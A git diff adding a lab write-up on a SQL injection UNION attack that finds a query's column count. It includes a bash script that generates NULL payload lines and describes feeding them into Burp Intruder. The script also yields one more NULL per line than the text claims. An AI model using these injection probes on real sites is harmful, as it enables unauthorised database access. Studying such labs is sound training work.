@@ -142,3 +142,47 @@ Which, finally, gives us our holy grail:
 ```
 
 With that, I logged into the administrator account, and the lab was solved. Not a single internal server error this time!
+
+---
+
+## 7. SQL injection UNION attack, determining the number of columns returned by the query
+<img src="./injection-column-number.png" width=400>
+
+### Description
+Another ramp-up in difficulty. The lab entails figuring out how many columns are in the table that contains the product details through a SQL injection UNION attack.
+
+### Solution
+Since we are forced into the latter half of a `SELECT` statement (i.e. `SELECT * FROM [table] WHERE category='{category}' ...`), there is little choice but to try and `UNION` a series of `NULL`s until we get a `200 OK` from the server instead of `500 Internal Server Error`.
+
+To make this easier, I created a bash script as follows:
+```
+min=${1:-1}
+max=${2:-100}
+
+for ((i=min; i<=max; i++)); do
+        printf 'NULL'
+        for ((j=1; j<=i; j++)); do
+                printf ', NULL'
+        done
+        printf '\n'
+done > null.txt
+```
+
+The above bash script will take two inputs, a minimum number and a maximum number. Upon being run, it will output a newline-separate series of NULLs, where the number of nulls is equivalent to its line number:
+```
+NULL
+NULL, NULL
+NULL, NULL, NULL
+...
+```
+
+I used this script to generate a series of NULLs up to 250 and loaded it into BurpSuite's Intruder, as follows:
+<img src="./injection-column-number-payload.png" width=400>
+
+I then included a payload position in the request to be substituted every iteration:
+<img src="./injection-column-number-req.png" width=400>
+
+I launched the attack and waited patiently... only for it to succeed on attempt 3.
+<img src="./injection-column-number-burp.png" width=400>
+
+Just like that, the lab was finished. The query had three columns. How anti-climactic.
